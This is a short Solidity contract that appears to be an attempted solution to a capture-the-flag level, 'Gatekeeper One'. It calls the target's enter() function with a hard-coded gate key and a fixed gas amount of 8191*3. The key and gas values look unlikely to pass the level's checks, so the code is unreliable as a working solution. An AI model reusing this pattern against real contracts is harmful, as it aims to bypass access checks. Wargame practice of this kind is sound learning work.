pragma solidity ^0.8.0;

interface GatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperFinal {
    address public instance;

    constructor(address _instance) {
        instance = _instance;
    }

    function getGateKey() internal pure returns (bytes8) {
        // 0x0000133700002266 when converted to uint64
        // First 16 bits: 0x0000, then 1337, then 0000, then 2266
        return bytes8(uint64(0x0000133700002266));
    }

    function gasAttack() external {
        GatekeeperOne(instance).enter{gas: 8191 * 3}(getGateKey());
    }
}
